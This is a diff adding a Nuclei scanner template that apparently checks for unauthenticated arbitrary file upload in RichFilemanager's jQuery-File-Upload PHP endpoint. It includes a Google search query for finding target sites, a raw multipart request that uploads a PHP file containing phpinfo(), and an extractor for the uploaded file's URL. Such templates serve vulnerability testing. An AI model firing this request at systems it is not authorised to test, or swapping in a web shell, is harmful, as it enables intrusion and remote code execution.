@@ -1,0 +1,48 @@
+id: arbritrary-file-upload
+info:
+  name: Arbritrary File Upload - Remote Code Execution
+  author: wjlin0
+  severity: critical
+  description: 你可以直接利用文件上传功能进行任意文件上传
+  metadata:
+    google-query: 'intext:dokumenary.net All rights reserved.'
+  tags: fileupload
+http:
+  - raw: 
+     - |+
+       POST /assets/comp/RichFilemanager/scripts/jQuery-File-Upload/server/php/ HTTP/2
+       Host: {{Hostname}}
+       Content-Length: 214
+       Accept: application/json, text/javascript, */*; q=0.01
+       Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrhshKURDxVwYD69L
+       X-Requested-With: XMLHttpRequest
+
+       ------WebKitFormBoundaryrhshKURDxVwYD69L
+       Content-Disposition: form-data; name="files[]"; filename="2.php"
+       Content-Type: application/octet-stream
+
+       <?php phpinfo();?>
+       ------WebKitFormBoundaryrhshKURDxVwYD69L--
+  
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "\"files\":["
+          - "\"name\""
+          - "deleteType"
+          - "deleteUrl"
+          - "type"
+        condition: and
+      - type: status
+        status:
+          - 200
+    
+    extractors:
+      - type: json
+        part: body
+        name: url
+        json:
+          - ".files|.[]|.url"
+# digest: 4a0a00473045022100b4d85c8eb240d47937e6083d63b95c0bd4a2d2b2806170465b1da4468b4487eb022042a4756168760d960919269d46c2fd86ad1eace4194fbef022359e4a186e5e17:9d8cf424f0e932381bf27cf1e926b867
